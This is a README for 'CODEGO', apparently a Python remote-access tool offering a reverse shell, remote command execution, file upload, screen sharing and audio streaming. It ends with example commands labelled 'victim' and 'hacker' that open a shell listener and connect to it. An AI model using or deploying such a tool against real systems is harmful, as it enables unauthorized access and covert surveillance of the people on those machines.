# 🎯 CODEGO: The Swiss Army Knife for Network Utility Tools

![Codego Banner](https://img.shields.io/badge/Python-3.x-blue?style=for-the-badge)
![Status](https://img.shields.io/badge/status-active-brightgreen?style=for-the-badge)
![License](https://img.shields.io/badge/license-MIT-red?style=for-the-badge)

> ⚠️ **For educational and authorized testing only. Unauthorized use is illegal.**

**CODEGO** is a powerful multi-tool Python script designed for ethical hackers, pen-testers, and sysadmins. It combines screen sharing, audio streaming (voice call), command execution, file uploading, and reverse shell features — all in one neat terminal-based utility.

---

## 🔧 Features

- 📡 **Reverse Shell Listener & Client**
- 🖥️ **Screen Sharing** (via `vidstream`)
- 🎙️ **Voice Calling** (via `pyaudio`)
- 📂 **File Uploading**
- 🛠️ **Remote Command Execution**
- 💻 **Interactive Command Shell**
- 🧠 **Custom ASCII Art & Themed UI**

---

## 🛠️ Installation

> Requires **Python 3.6+**

### 🔗 Install dependencies

```bash
pip install -r requirements.txt

python3 codego.py -t <target_ip> -p <port> [options]


| Flag | Long Option | Description                                      |
| ---- | ----------- | ------------------------------------------------ |
| `-l` | `--listen`  | Listen for incoming connections                  |
| `-e` | `--execute` | Execute a specified command/file upon connection |
| `-c` | `--command` | Open interactive shell                           |
| `-u` | `--upload`  | Upload a file to a destination                   |
| `-s` | `--stream`  | Start screen sharing session                     |
| `-a` | `--audio`   | Start voice call session                         |
| `-t` | `--target`  | Target IP address                                |
| `-p` | `--port`    | Port number                                      |


victim:
python3 codego.py -l -p 4444 -c

hacker:
python3 codego.py -t 192.168.1.5 -p 4444


